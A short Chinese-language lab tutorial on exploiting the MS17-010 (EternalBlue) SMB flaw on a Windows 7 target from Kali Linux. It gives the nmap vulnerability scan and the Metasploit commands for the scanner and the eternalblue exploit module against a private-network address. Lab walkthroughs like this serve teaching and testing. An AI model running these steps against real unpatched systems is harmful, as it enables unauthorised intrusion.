实验环境：

攻击机：kali Linux  IP地址：192.168.1.110

靶机： Windows7   IP地址：192.168.1.109

漏洞利用名称：ms17-010（永恒之蓝）

实验步骤：

首先通过nmap工具扫描靶机上存在的漏洞

msfconsole

nmap --script=vuln 192.168.1.109(靶机地址）

通过扫描发现靶机存在三个漏洞，我们今天要利用的就是其中的一个ms17-010

然后加载漏洞脚本

use  auxiliary/scanner/smb/smb_ms17_010

设置被攻击对象的地址

       set RHOSTS 192.168.1.109

查看对应的端口和地址是否加载正常

show options

主要查看RHOSTS和RPORT是不是你设置的靶机的地址和445端口，永恒之蓝主要就是通过445端口进行入侵的。

检测能否利用

run   如图所示即可入侵

use  exploit/windows/smb/ms17_010_eternalblue

show options

set RHOST 192.168.1.109(被攻击者地址）

开始攻击

exploit （或者用run也可）
